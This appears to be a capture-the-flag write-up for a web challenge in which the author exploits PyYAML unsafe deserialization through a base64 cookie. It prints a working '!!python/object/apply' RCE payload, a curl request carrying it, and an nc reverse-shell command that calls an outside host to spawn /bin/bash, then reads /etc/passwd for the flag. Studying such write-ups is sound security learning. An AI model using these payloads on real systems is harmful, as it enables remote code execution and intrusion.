
# Challenge Name: password hint


![date](https://img.shields.io/badge/date-02.03.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![crypto category](https://img.shields.io/badge/category-Web-blueviolet.svg)   
![level](https://img.shields.io/badge/level-Medium-blue.svg)
![score](https://img.shields.io/badge/score-100-blue.svg)




## Detailed solution

Opening the challenge link http://52.59.239.147/api/v1/ we found a json output  

```json
{
  "api_data": "The api is still under construction, updates coming soon!"
}
```

I start checking the response headers, we have a base64 encoded data in cookie  

```
Cookie: data=YXBpX2RhdGE6IFRoZSBhcGkgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==  
```
Let's decode it : api_data: The api is still under construction, updates coming soon!  

It give us the same as the response output.

The challenge description refer to a use of Python YAML, there's a known vulnerability in PyYamal, a deserialization RCE attack  

https://dl.packetstormsecurity.net/papers/general/yaml-deserialization.pdf  

Now we need to use a payload and put it insid cookie, i started by a payload to run the command "ls"   

```
test: !!python/object/apply:subprocess.check_output ["ls"]
encode with base64 : dGVzdDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFsibHMiXQo=
```
I'll use curl to send the request  

```
curl 'http://52.59.239.147/api/v1/' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7' \
  -H 'Cookie: data=InRlc3QiOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5jaGVja19vdXRwdXQgWyJscyJdCg==' \
  --compressed \
  --insecure
```  
We can see all files in the app directory. (the output now is different from the day i solved the challenge)

The challenge description talk about the passwd file so the solution for the challenge is to read the /etc/passwd.  

I tried to use the command cat with the payload but i was not able to print the file content.  

I'll use the os.system to create a reverse shell using nc 

```
test: !!python/object/apply:os.system ["nc 10.10.10.10 4444 -e /bin/bash"]
``` 
I got a reverse shell   

```bash
nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.100] from (UNKNOWN) [52.59.239.147] 37595
id
uid=1000(app) gid=1000(app) groups=1000(app) 
```   
Let's read the passwd file 
  
```bash
cat /etc/passwd  

administrator:FLAG{aa330d7755f14d398cbfef715bbf36f59a8cfae5}:1000:1000:administrator,,,:/home/administrator:/bin/bash
```  

## Flag

```
FLAG{aa330d7755f14d398cbfef715bbf36f59a8cfae5}
```
